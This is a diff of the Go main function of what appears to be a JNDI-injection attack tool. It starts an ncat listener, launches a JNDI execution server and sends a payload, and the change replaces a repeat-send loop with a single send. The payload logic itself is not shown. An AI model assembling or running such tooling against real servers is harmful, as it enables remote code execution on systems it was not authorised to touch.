@@ -1,41 +1,50 @@
 package main
 
 import (
-	"bufio"
+	// "bufio"
+	// "os"
 	"fmt"
 	"myapp/lib/execjndi"
 	"myapp/lib/ncat"
 	"myapp/lib/payload"
 	"myapp/lib/sysinfo"
-	"os"
 )
 
 func main() {
 	banner()
 	ncat.StartNcat()
+	// startPayload := make(chan bool)
+	// exitChan := make(chan struct{})
+	// go func() {
+	// 	execjndi.ExecJNDI(startPayload)
+	// }()
+	// go func() {
+	// 	<-startPayload
+	// 	for {
+	// 		payload.PayloadInput()
+	// 		fmt.Println("Do you want to send another payload? (yes/no)")
+	// 		scanner := bufio.NewScanner(os.Stdin)
+	// 		if scanner.Scan() {
+	// 			response := scanner.Text()
+	// 			if response != "yes" {
+	// 				close(exitChan)
+	// 				break
+	// 			}
+	// 		}
+	// 	}
+	// }()
+	// <-exitChan
+	// fmt.Println("Exiting...")
+	// os.Exit(0)
 	startPayload := make(chan bool)
-	exitChan := make(chan struct{})
 	go func() {
 		execjndi.ExecJNDI(startPayload)
 	}()
 	go func() {
 		<-startPayload
-		for {
-			payload.PayloadInput()
-			fmt.Println("Do you want to send another payload? (yes/no)")
-			scanner := bufio.NewScanner(os.Stdin)
-			if scanner.Scan() {
-				response := scanner.Text()
-				if response != "yes" {
-					close(exitChan)
-					break
-				}
-			}
-		}
+		payload.PayloadInput()
 	}()
-	<-exitChan
-	fmt.Println("Exiting...")
-	os.Exit(0)
+	select {}
 }
 
 func banner() {
